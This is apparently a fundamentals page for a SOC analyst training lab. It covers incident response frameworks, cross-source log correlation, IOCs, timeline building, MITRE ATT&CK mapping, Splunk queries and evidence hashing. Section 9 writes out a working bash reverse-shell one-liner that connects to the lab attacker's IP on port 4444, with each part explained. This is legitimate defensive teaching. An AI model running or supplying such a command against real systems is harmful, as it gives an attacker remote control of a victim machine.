# SOC Investigation Simulation — Fundamentals

# 📌 Overview

This page covers the **new fundamentals** introduced in the End-to-End SOC Investigation Simulation lab. Prior knowledge from the SSH Brute Force, Port Scan Detection, and Reverse Shell Detection labs is assumed.

---

# ✅ What You Already Know

| Tool / Concept | Covered In |
| --- | --- |
| Nmap — port scanning, service enumeration | Port Scan Detection Lab |
| Netcat — reverse shells, listeners | Reverse Shell Detection Lab |
| Metasploit — exploitation, payloads, sessions | Reverse Shell Detection Lab |
| Wireshark — packet capture, filtering | Reverse Shell Labs |
| Splunk — log ingestion, basic SPL, alerts | Brute Force and Port Scan Detection Lab |
| MITRE ATT&CK — mapping techniques to tactics | All previous labs |

---

# 🆕 New Fundamentals

## 1. The Incident Response Lifecycle

SOC analysts follow a structured process when handling incidents. Two widely used frameworks:

### NIST SP 800-61

```
Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity
```

### PICERL (SANS Version)

| Phase | What Happens |
| --- | --- |
| **P**reparation | Tools, playbooks, and logging in place |
| **I**dentification | Something looks wrong — is this an incident? |
| **C**ontainment | Stop the bleeding — isolate the affected system |
| **E**radication | Remove the threat (malware, backdoor, etc.) |
| **R**ecovery | Restore normal operations |
| **L**essons Learned | Write up what happened and how to improve |

> 🔍 In this lab, **Identification** is the phase you focus on most heavily — analysing logs and packets to determine what happened.
> 
- 💭 Why does this matter?
    
    Without a structured IR process, analysts can miss steps, contaminate evidence, or fail to fully remove a threat. PICERL gives you a repeatable, professional framework that is used in real SOC environments worldwide.
    

---

## 2. The Attack Chain as a Unified Narrative

Previous labs covered each attack stage in isolation. This lab chains them together deliberately.

```
Reconnaissance  (Nmap)
       ↓
Exploitation    (Hydra Brute Force)
       ↓
Initial Access  (SSH Login)
       ↓
Post-Exploitation / C2  (Reverse Shell via Bash/Netcat)
```

This maps directly onto the **Cyber Kill Chain** (Lockheed Martin model).

> 🔄 **Key Analyst Mindset:** As a SOC analyst, you read the attacker's story **backwards** — starting from the alert and working back to the origin. You need to understand the full chain to do this effectively.
> 
- 💭 Why does thinking backwards matter?
    
    Alerts typically fire at the **end** of an attack chain (e.g. a suspicious outbound connection). The analyst must trace back through logs to find the original entry point, the method used, and the timeline of events — all in reverse chronological order.
    

---

## 3. Log Correlation Across Multiple Sources

This is the **biggest new skill** introduced in this lab. Previous labs correlated events within a single log source. Here you join evidence across multiple independent sources.

| Source | What It Tells You |
| --- | --- |
| **Wireshark** | Raw packets — ground truth of what went over the wire |
| **Splunk (auth.log)** | Authentication events on the target system |
| **Splunk (syslog/IPTABLES)** | Network-level events logged by the firewall |
| **Metasploit** | Attacker-side confirmation of what succeeded |

The goal is to use these together to answer:

> **Who did what, to which system, at what time, and how?**
> 
- 💭 Why multiple sources?
    
    No single log source tells the full story. An attacker might be able to clear one log but not another. Corroborating the same event across multiple sources also makes your evidence much stronger — especially if it ends up in a legal or disciplinary context.
    

---

## 4. Indicators of Compromise (IOCs)

An **IOC** is a piece of evidence that indicates a system may have been compromised.

### Common IOC Types

| IOC Type | Example from This Lab |
| --- | --- |
| Suspicious IP address | `192.168.102.4` making 442 SSH attempts |
| Unusual port activity | Outbound connection on port `4444` |
| Credential abuse | `s3rvic:password1` used after brute force |
| Anomalous process behaviour | Bash spawning a TCP reverse shell |
| Traffic volume spike | 442 failed logins in under 2 minutes |

> 📋 In your incident report, IOCs are formally listed and passed to threat intelligence teams or used to build new detection rules.
> 

---

## 5. Structured Incident Timeline

The timeline is the **primary deliverable** of a SOC investigation. It is a chronological, evidence-backed record of every significant event — formatted so that someone who wasn't there can fully understand what happened.

### Standard Format

```
[Timestamp] | Event Description          | Source / Evidence      | MITRE Technique
------------|---------------------------|------------------------|----------------
15:35:51    | Nmap -A scan launched     | Wireshark SYN packets  | T1046
15:35:51    | SSH brute force began     | Splunk auth.log        | T1110.001
15:36:51    | Credentials discovered    | Hydra output           | T1110.001
15:46:23    | Successful SSH login      | Splunk auth.log        | T1078
16:09:23    | Reverse shell established | Wireshark TCP stream   | T1059.004
16:09:23    | whoami and ip a executed  | Wireshark plaintext    | T1033
```

- 💭 Why must every event have an evidence source?
    
    Without a cited evidence source, a claim in an incident report is just an opinion. Citing the specific log file, packet number, or tool output makes the timeline **defensible** — another analyst (or a court) can verify every single entry independently.
    

---

## 6. MITRE ATT&CK Techniques Used in This Lab

| Technique ID | Name | Stage | Description |
| --- | --- | --- | --- |
| **T1046** | Network Service Scanning | Reconnaissance | Nmap -A scan against Ubuntu |
| **T1110.001** | Brute Force: Password Guessing | Credential Access | Hydra SSH brute force (442 attempts) |
| **T1078** | Valid Accounts | Initial Access | SSH login using stolen credentials |
| **T1059.004** | Unix Shell | Execution | Bash reverse shell payload |
| **T1033** | System Owner/User Discovery | Discovery | Running `whoami` and `ip a` post-access |

> 🗂️ **Tactic vs Technique:** TA numbers (e.g. TA0043) refer to the **goal** (tactic). T numbers (e.g. T1046) refer to the **method** (technique). Always cite both when writing reports.
> 

---

## 7. Splunk SPL for Cross-Source Correlation

This lab introduces slightly more advanced SPL — correlating events by IP and time window across different sourcetypes.

### Key SPL Queries Used

```
# Count failed login attempts
index=main sourcetype="linux_secure" "Failed password" host="ubuntu-target"
| stats count by host

# Find successful logins
index=main sourcetype="linux_secure" "Accepted password" host="ubuntu-target"
| table _time, host, source

# Find C2 activity on port 4444
index=main host="ubuntu-target" "4444"
| timechart count span=1m

# Full incident timeline
index=main host="ubuntu-target"
("Failed password" OR "Accepted password" OR "4444")
| table _time, sourcetype, host, _raw
| sort _time
```

- 💭 What is timechart and why is it useful?
    
    `timechart` is a Splunk command that buckets events by time intervals (e.g. `span=1m` = per minute). It is ideal for visualising attack spikes — a sudden surge in failed logins becomes immediately obvious as a sharp spike on a line chart, even to a non-technical manager.
    

---

## 8. Evidence Integrity — SHA256 Hashing

When capturing forensic evidence (like a PCAP file), you must prove it hasn't been tampered with. This is done by **hashing the file** immediately after capture.

```bash
# Generate and save the hash
sha256sum /home/kali/Desktop/soc_investigation.pcapng > /home/kali/Desktop/pcap_hash.txt

# Verify it saved correctly
cat /home/kali/Desktop/pcap_hash.txt
```

> 🔐 **Why this matters:** If even a **single byte** of the file changes after hashing, the hash value becomes completely different. This means the hash proves the file is identical to when it was first captured — making it legally and forensically defensible.
> 

---

## 9. Reverse Shell — Technical Breakdown

### Bash Reverse Shell One-Liner

```bash
bash -i >& /dev/tcp/192.168.102.4/4444 0>&1
```

| Component | Meaning |
| --- | --- |
| `bash -i` | Spawns an **interactive** bash shell |
| `/dev/tcp/IP/PORT` | Linux treats this as a raw TCP connection (no extra tools needed) |
| `>&` | Redirects **stdout and stderr** to the TCP connection |
| `0>&1` | Redirects **stdin** to come from the TCP connection |

> ⚠️ **Why it's detectable:** A bash reverse shell sends data as **plain unencrypted TCP**. Unlike SSH, every command typed and every response is visible in Wireshark as readable ASCII text — making it easily detectable by any analyst monitoring the network.
> 
    
---

# 🧠 Summary — New Concepts at a Glance

| Concept | Why It Matters |
| --- | --- |
| IR Lifecycle (NIST/PICERL) | Industry-standard framework used in every real SOC |
| Attack chain as a narrative | Helps you think like both attacker and defender simultaneously |
| Cross-source log correlation | Core SOC analyst skill — no single log tells the full story |
| IOC identification | What you are actively hunting for during an investigation |
| Incident timeline format | The professional deliverable expected from a SOC analyst |
| Evidence integrity (hashing) | Makes forensic evidence legally and professionally defensible |
